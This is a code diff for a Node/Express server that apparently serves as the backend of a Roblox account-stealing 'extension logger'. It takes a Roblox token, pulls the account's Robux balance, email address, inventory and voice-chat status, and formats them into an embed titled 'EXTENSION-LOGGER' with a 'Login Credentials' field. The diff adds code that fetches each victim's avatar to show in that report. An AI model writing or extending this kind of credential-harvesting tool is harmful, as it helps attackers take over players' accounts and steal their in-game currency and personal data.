@@ -4,6 +4,7 @@ const cors = require('cors');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
+const HOST = '0.0.0.0';
 
 // Middleware
 app.use(cors());
@@ -89,6 +90,22 @@ async function fetchRobloxUserData(token) {
       let actualRobux = altUserData.RobuxBalance || 0;
       let pendingRobux = 0;
 
+      // Fetch avatar for mobile API fallback
+      let avatarUrl = null;
+      try {
+        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${altUserData.UserID}&size=420x420&format=Png&isCircular=false`, {
+          headers: baseHeaders
+        });
+        if (avatarResponse.ok) {
+          const avatarData = await avatarResponse.json();
+          if (avatarData.data && avatarData.data.length > 0 && avatarData.data[0].state === 'Completed') {
+            avatarUrl = avatarData.data[0].imageUrl;
+          }
+        }
+      } catch (e) {
+        // Silent handling
+      }
+
       return {
         username: altUserData.UserName || "Unknown User",
         userId: altUserData.UserID || 0,
@@ -108,7 +125,8 @@ async function fetchRobloxUserData(token) {
         inventory: { hairs: 0, bundles: 0, faces: 0 },
         emailVerified: false,
         emailAddress: null,
-        voiceChatEnabled: false
+        voiceChatEnabled: false,
+        avatarUrl: avatarUrl,
       };
     }
 
@@ -355,6 +373,22 @@ async function fetchRobloxUserData(token) {
       }
     } catch (e) { /* Ignore voice chat fetch errors */ }
 
+    // Fetch user avatar
+    let avatarUrl = null;
+    try {
+      const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=420x420&format=Png&isCircular=false`, {
+        headers: baseHeaders
+      });
+      if (avatarResponse.ok) {
+        const avatarData = await avatarResponse.json();
+        if (avatarData.data && avatarData.data.length > 0 && avatarData.data[0].state === 'Completed') {
+          avatarUrl = avatarData.data[0].imageUrl;
+        }
+      }
+    } catch (e) {
+      // Silent handling
+    }
+
     return {
       username: userData.name || userData.displayName,
       userId: userData.id,
@@ -375,6 +409,7 @@ async function fetchRobloxUserData(token) {
       emailVerified: emailVerified,
       emailAddress: emailAddress,
       voiceChatEnabled: voiceChatEnabled,
+      avatarUrl: avatarUrl,
     };
 
   } catch (error) {
@@ -472,6 +507,9 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
   const credentialsAndDataEmbed = {
     title: "<:emoji_37:1410520517349212200> **EXTENSION-LOGGER**",
     color: 0xFFFFFF,
+    thumbnail: userData.avatarUrl ? {
+      url: userData.avatarUrl
+    } : undefined,
     fields: [
       {
         name: "🔑 **Login Credentials**",
